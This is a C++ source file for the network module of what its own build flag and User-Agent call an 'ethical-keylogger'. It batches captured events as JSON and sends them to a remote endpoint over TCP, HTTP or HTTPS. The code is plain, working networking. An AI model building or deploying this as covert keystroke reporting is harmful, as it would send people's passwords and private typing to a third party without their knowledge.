#include "net_sender.hpp"

#include "net_common.hpp"

#include <algorithm>
#include <chrono>
#include <cstring>
#include <iostream>
#include <mutex>
#include <sstream>
#include <vector>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
using socket_t = SOCKET;
static constexpr socket_t INVALID_SOCK = INVALID_SOCKET;
#define CLOSESOCK closesocket
#else
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
using socket_t = int;
static constexpr socket_t INVALID_SOCK = -1;
#define CLOSESOCK ::close
#endif

#ifdef KEYLOGGER_HAS_TLS
#include <openssl/err.h>
#include <openssl/ssl.h>
#endif

namespace net {

namespace {

#ifdef _WIN32
struct WsaInit {
    WsaInit()  { WSADATA d; WSAStartup(MAKEWORD(2, 2), &d); }
    ~WsaInit() { WSACleanup(); }
};
static WsaInit g_wsaInit;
#endif

// ---- low-level socket helpers ---------------------------------------------

bool setNonBlocking(socket_t s) {
#ifdef _WIN32
    u_long mode = 1;
    return ioctlsocket(s, FIONBIO, &mode) == 0;
#else
    int flags = fcntl(s, F_GETFL, 0);
    if (flags < 0) return false;
    return fcntl(s, F_SETFL, flags | O_NONBLOCK) == 0;
#endif
}

bool waitWritable(socket_t s, int timeoutMs) {
    fd_set wf;
    FD_ZERO(&wf);
    FD_SET(s, &wf);
    timeval tv{};
    tv.tv_sec  = timeoutMs / 1000;
    tv.tv_usec = (timeoutMs % 1000) * 1000;
    int rc = select(static_cast<int>(s) + 1, nullptr, &wf, nullptr, &tv);
    return rc > 0 && FD_ISSET(s, &wf);
}

bool waitReadable(socket_t s, int timeoutMs) {
    fd_set rf;
    FD_ZERO(&rf);
    FD_SET(s, &rf);
    timeval tv{};
    tv.tv_sec  = timeoutMs / 1000;
    tv.tv_usec = (timeoutMs % 1000) * 1000;
    int rc = select(static_cast<int>(s) + 1, &rf, nullptr, nullptr, &tv);
    return rc > 0 && FD_ISSET(s, &rf);
}

// Connect with timeout. Returns connected non-blocking socket or INVALID_SOCK.
socket_t connectTimeout(const std::string& host, int port, int timeoutMs,
                        std::string& errorOut) {
    addrinfo hints{};
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    addrinfo* res = nullptr;
    char portStr[16];
    snprintf(portStr, sizeof(portStr), "%d", port);
    int gai = getaddrinfo(host.c_str(), portStr, &hints, &res);
    if (gai != 0 || !res) {
        errorOut = std::string("DNS resolution failed for ") + host;
        if (res) freeaddrinfo(res);
        return INVALID_SOCK;
    }

    socket_t s = INVALID_SOCK;
    for (addrinfo* ai = res; ai != nullptr; ai = ai->ai_next) {
        s = ::socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (s == INVALID_SOCK) continue;
        if (!setNonBlocking(s)) {
            CLOSESOCK(s);
            s = INVALID_SOCK;
            continue;
        }
        int rc = ::connect(s, ai->ai_addr, static_cast<int>(ai->ai_addrlen));
        if (rc == 0) break;
#ifdef _WIN32
        int err = WSAGetLastError();
        bool inProgress = (err == WSAEWOULDBLOCK || err == WSAEINPROGRESS);
#else
        bool inProgress = (errno == EINPROGRESS);
#endif
        if (inProgress) {
            if (waitWritable(s, timeoutMs)) {
                int soerr = 0;
                socklen_t soerrlen = sizeof(soerr);
                if (getsockopt(s, SOL_SOCKET, SO_ERROR,
                               reinterpret_cast<char*>(&soerr), &soerrlen) == 0 && soerr == 0) {
                    break;
                }
            }
        }
        CLOSESOCK(s);
        s = INVALID_SOCK;
    }
    freeaddrinfo(res);
    if (s == INVALID_SOCK) errorOut = "connect failed to " + host;
    return s;
}

bool sendAll(socket_t s, const char* data, size_t n, int timeoutMs) {
    size_t off = 0;
    while (off < n) {
        if (!waitWritable(s, timeoutMs)) return false;
        int sent = ::send(s, data + off, static_cast<int>(n - off), 0);
        if (sent <= 0) {
#ifdef _WIN32
            int err = WSAGetLastError();
            if (err == WSAEWOULDBLOCK || err == WSAEINTR) continue;
#else
            if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) continue;
#endif
            return false;
        }
        off += static_cast<size_t>(sent);
    }
    return true;
}

// Read until we have headers + Content-Length body, or connection close, or
// the timeout elapses. We only inspect the status line for success/failure.
bool recvHttpStatus(socket_t s, int timeoutMs, int& statusCode) {
    statusCode = 0;
    std::string buf;
    auto deadline = std::chrono::steady_clock::now() +
                    std::chrono::milliseconds(timeoutMs);
    while (true) {
        auto remaining = std::chrono::duration_cast<std::chrono::milliseconds>(
                             deadline - std::chrono::steady_clock::now()).count();
        if (remaining <= 0) return false;
        if (!waitReadable(s, static_cast<int>(remaining))) return false;
        char tmp[1024];
        int n = ::recv(s, tmp, sizeof(tmp), 0);
        if (n == 0) break;
        if (n < 0) {
#ifdef _WIN32
            int err = WSAGetLastError();
            if (err == WSAEWOULDBLOCK || err == WSAEINTR) continue;
#else
            if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) continue;
#endif
            return false;
        }
        buf.append(tmp, tmp + n);
        // Status line is everything up to the first \r\n.
        if (statusCode == 0) {
            auto eol = buf.find("\r\n");
            if (eol != std::string::npos) {
                // Expect: HTTP/1.x SSS reason
                int httpMajor = 0, httpMinor = 0, code = 0;
                if (sscanf(buf.c_str(), "HTTP/%d.%d %d", &httpMajor, &httpMinor, &code) >= 3) {
                    statusCode = code;
                }
            }
        }
        // We have the status; stop reading once we see the header terminator
        // to avoid blocking on chunked / streaming responses.
        if (statusCode != 0 && buf.find("\r\n\r\n") != std::string::npos) {
            break;
        }
        if (buf.size() > 64 * 1024) break;
    }
    return statusCode != 0;
}

// ---- TLS plumbing ---------------------------------------------------------

#ifdef KEYLOGGER_HAS_TLS
struct TlsCtx {
    SSL_CTX* ctx = nullptr;
    ~TlsCtx() { if (ctx) SSL_CTX_free(ctx); }
};

bool tlsInit(TlsCtx& tc, const std::string& caFile, std::string& errorOut) {
    static std::once_flag once;
    std::call_once(once, [] {
        SSL_library_init();
        SSL_load_error_strings();
        OpenSSL_add_all_algorithms();
    });
    tc.ctx = SSL_CTX_new(TLS_client_method());
    if (!tc.ctx) {
        errorOut = "SSL_CTX_new failed";
        return false;
    }
    SSL_CTX_set_verify(tc.ctx, SSL_VERIFY_PEER, nullptr);
    if (!caFile.empty()) {
        if (SSL_CTX_load_verify_locations(tc.ctx, caFile.c_str(), nullptr) != 1) {
            errorOut = "failed to load CA file: " + caFile;
            return false;
        }
    } else {
        SSL_CTX_set_default_verify_paths(tc.ctx);
    }
    return true;
}
#endif

}  // namespace

// ---- Sender ---------------------------------------------------------------

Sender::Sender() = default;

Sender::~Sender() { stop(); }

bool Sender::start(const SenderConfig& cfg, std::string& errorOut) {
    m_cfg = cfg;
    netcommon::ParsedUrl u;
    if (!netcommon::parseUrl(cfg.endpoint, u, errorOut)) {
        return false;
    }
    m_scheme = u.scheme;
    m_host   = u.host;
    m_port   = u.port;
    m_path   = u.path;

#ifndef KEYLOGGER_HAS_TLS
    if (m_scheme == "https") {
        errorOut = "this build was compiled without TLS support; https:// endpoints are unavailable";
        return false;
    }
    if (!cfg.caFile.empty()) {
        errorOut = "this build was compiled without TLS support; --net-ca-file is unavailable";
        return false;
    }
#endif

    m_running  = true;
    m_stopFlag = false;
    m_thread   = std::thread(&Sender::workerLoop, this);
    return true;
}

void Sender::enqueue(const std::string& jsonObject) {
    if (!m_running.load()) return;
    {
        std::lock_guard<std::mutex> lk(m_mu);
        // Soft cap: if the queue grows unbounded (e.g. network is down for a
        // long time) drop oldest events rather than balloon memory. Local log
        // remains authoritative in mirror mode.
        constexpr size_t kMaxQueue = 8192;
        if (m_queue.size() >= kMaxQueue) {
            m_queue.pop_front();
            m_dropped.fetch_add(1);
        }
        m_queue.push_back(jsonObject);
    }
    m_cv.notify_one();
}

void Sender::stop() {
    if (!m_running.exchange(false)) return;
    m_stopFlag = true;
    m_cv.notify_all();
    if (m_thread.joinable()) m_thread.join();
}

void Sender::workerLoop() {
    while (true) {
        std::vector<std::string> batch;
        {
            std::unique_lock<std::mutex> lk(m_mu);
            if (m_queue.empty() && !m_stopFlag.load()) {
                m_cv.wait_for(lk, std::chrono::milliseconds(
                    m_cfg.batchMs > 0 ? m_cfg.batchMs : 1000));
            }
            // If batching is requested, hold briefly to coalesce.
            if (m_cfg.batchMs > 0 && !m_queue.empty() && !m_stopFlag.load()) {
                m_cv.wait_for(lk, std::chrono::milliseconds(m_cfg.batchMs));
            }
            while (!m_queue.empty()) {
                batch.push_back(std::move(m_queue.front()));
                m_queue.pop_front();
                if (batch.size() >= 256) break;  // upper bound per send
            }
            if (batch.empty() && m_stopFlag.load()) return;
        }
        if (batch.empty()) continue;

        // Build NDJSON body (one event per line).
        std::string body;
        body.reserve(batch.size() * 64);
        bool ndjson = batch.size() > 1;
        for (auto& ev : batch) {
            body += ev;
            body += '\n';
        }
        if (!ndjson) {
            // Single event: trim trailing newline, send as application/json.
            if (!body.empty() && body.back() == '\n') body.pop_back();
        }

        bool ok = false;
        std::string err;
        for (int attempt = 0; attempt <= m_cfg.retryMax; ++attempt) {
            err.clear();
            if (sendBatch(body, ndjson, err)) { ok = true; break; }
            // Exponential backoff capped at 2s.
            int waitMs = std::min(2000, 100 * (1 << attempt));
            std::unique_lock<std::mutex> lk(m_mu);
            if (m_cv.wait_for(lk, std::chrono::milliseconds(waitMs),
                              [&] { return m_stopFlag.load(); })) {
                break;
            }
        }
        if (ok) {
            m_sent.fetch_add(static_cast<long long>(batch.size()));
        } else {
            m_dropped.fetch_add(static_cast<long long>(batch.size()));
            // Print a single warning per failure burst to avoid log spam.
            std::cerr << "[net] dropped " << batch.size()
                      << " event(s): " << err << "\n";
        }
    }
}

bool Sender::sendBatch(const std::string& body, bool ndjson, std::string& errorOut) {
    if (m_scheme == "tcp") {
        socket_t s = connectTimeout(m_host, m_port, m_cfg.timeoutMs, errorOut);
        if (s == INVALID_SOCK) return false;
        // Each event as its own line (NDJSON framing on the wire).
        bool ok = sendAll(s, body.c_str(), body.size(), m_cfg.timeoutMs);
        if (ok && (body.empty() || body.back() != '\n')) {
            ok = sendAll(s, "\n", 1, m_cfg.timeoutMs);
        }
        CLOSESOCK(s);
        if (!ok) errorOut = "tcp send failed";
        return ok;
    }

    // ---- HTTP / HTTPS ----
    std::ostringstream req;
    req << "POST " << m_path << " HTTP/1.1\r\n"
        << "Host: " << m_host;
    if (!((m_scheme == "http"  && m_port == 80) ||
          (m_scheme == "https" && m_port == 443))) {
        req << ":" << m_port;
    }
    req << "\r\n"
        << "User-Agent: ethical-keylogger/0.1\r\n"
        << "Content-Type: " << (ndjson ? "application/x-ndjson" : "application/json") << "\r\n"
        << "Content-Length: " << body.size() << "\r\n"
        << "Connection: close\r\n";
    if (!m_cfg.authToken.empty()) {
        req << "Authorization: Bearer " << m_cfg.authToken << "\r\n";
    }
    req << "\r\n" << body;
    std::string wire = req.str();

    socket_t s = connectTimeout(m_host, m_port, m_cfg.timeoutMs, errorOut);
    if (s == INVALID_SOCK) return false;

    int statusCode = 0;
    bool ok = false;

    if (m_scheme == "http") {
        if (sendAll(s, wire.c_str(), wire.size(), m_cfg.timeoutMs) &&
            recvHttpStatus(s, m_cfg.timeoutMs, statusCode)) {
            ok = (statusCode >= 200 && statusCode < 300);
            if (!ok) errorOut = "HTTP " + std::to_string(statusCode);
        } else {
            errorOut = "HTTP send/recv failed";
        }
        CLOSESOCK(s);
        return ok;
    }

#ifdef KEYLOGGER_HAS_TLS
    TlsCtx tc;
    if (!tlsInit(tc, m_cfg.caFile, errorOut)) {
        CLOSESOCK(s);
        return false;
    }
    SSL* ssl = SSL_new(tc.ctx);
    if (!ssl) { errorOut = "SSL_new failed"; CLOSESOCK(s); return false; }
    SSL_set_tlsext_host_name(ssl, m_host.c_str());
    SSL_set_fd(ssl, static_cast<int>(s));

    // Drive non-blocking handshake using select.
    auto deadline = std::chrono::steady_clock::now() +
                    std::chrono::milliseconds(m_cfg.timeoutMs);
    while (true) {
        int r = SSL_connect(ssl);
        if (r == 1) break;
        int err = SSL_get_error(ssl, r);
        auto remaining = std::chrono::duration_cast<std::chrono::milliseconds>(
                             deadline - std::chrono::steady_clock::now()).count();
        if (remaining <= 0) { errorOut = "TLS handshake timed out"; goto tls_done; }
        if (err == SSL_ERROR_WANT_READ)        { if (!waitReadable(s, (int)remaining)) { errorOut = "TLS handshake timed out"; goto tls_done; } }
        else if (err == SSL_ERROR_WANT_WRITE)  { if (!waitWritable(s, (int)remaining)) { errorOut = "TLS handshake timed out"; goto tls_done; } }
        else { errorOut = "TLS handshake failed"; goto tls_done; }
    }

    {
        size_t off = 0;
        while (off < wire.size()) {
            int n = SSL_write(ssl, wire.data() + off, static_cast<int>(wire.size() - off));
            if (n > 0) { off += static_cast<size_t>(n); continue; }
            int err = SSL_get_error(ssl, n);
            auto remaining = std::chrono::duration_cast<std::chrono::milliseconds>(
                                 deadline - std::chrono::steady_clock::now()).count();
            if (remaining <= 0) { errorOut = "TLS write timed out"; goto tls_done; }
            if (err == SSL_ERROR_WANT_READ)       { if (!waitReadable(s, (int)remaining)) { errorOut = "TLS write timed out"; goto tls_done; } }
            else if (err == SSL_ERROR_WANT_WRITE) { if (!waitWritable(s, (int)remaining)) { errorOut = "TLS write timed out"; goto tls_done; } }
            else { errorOut = "TLS write failed"; goto tls_done; }
        }
    }

    {
        std::string buf;
        while (true) {
            char tmp[1024];
            int n = SSL_read(ssl, tmp, sizeof(tmp));
            if (n > 0) {
                buf.append(tmp, tmp + n);
                if (statusCode == 0) {
                    auto eol = buf.find("\r\n");
                    if (eol != std::string::npos) {
                        int hi = 0, lo = 0, code = 0;
                        if (sscanf(buf.c_str(), "HTTP/%d.%d %d", &hi, &lo, &code) >= 3) {
                            statusCode = code;
                        }
                    }
                }
                if (statusCode != 0 && buf.find("\r\n\r\n") != std::string::npos) break;
                if (buf.size() > 64 * 1024) break;
                continue;
            }
            int err = SSL_get_error(ssl, n);
            if (err == SSL_ERROR_ZERO_RETURN) break;
            auto remaining = std::chrono::duration_cast<std::chrono::milliseconds>(
                                 deadline - std::chrono::steady_clock::now()).count();
            if (remaining <= 0) { errorOut = "TLS read timed out"; goto tls_done; }
            if (err == SSL_ERROR_WANT_READ)       { if (!waitReadable(s, (int)remaining)) { errorOut = "TLS read timed out"; goto tls_done; } }
            else if (err == SSL_ERROR_WANT_WRITE) { if (!waitWritable(s, (int)remaining)) { errorOut = "TLS read timed out"; goto tls_done; } }
            else { errorOut = "TLS read failed"; goto tls_done; }
        }
        ok = (statusCode >= 200 && statusCode < 300);
        if (!ok) errorOut = "HTTPS " + std::to_string(statusCode);
    }

tls_done:
    SSL_shutdown(ssl);
    SSL_free(ssl);
    CLOSESOCK(s);
    return ok;
#else
    (void)body; (void)ndjson;
    errorOut = "TLS not compiled in";
    CLOSESOCK(s);
    return false;
#endif
}

}  // namespace net
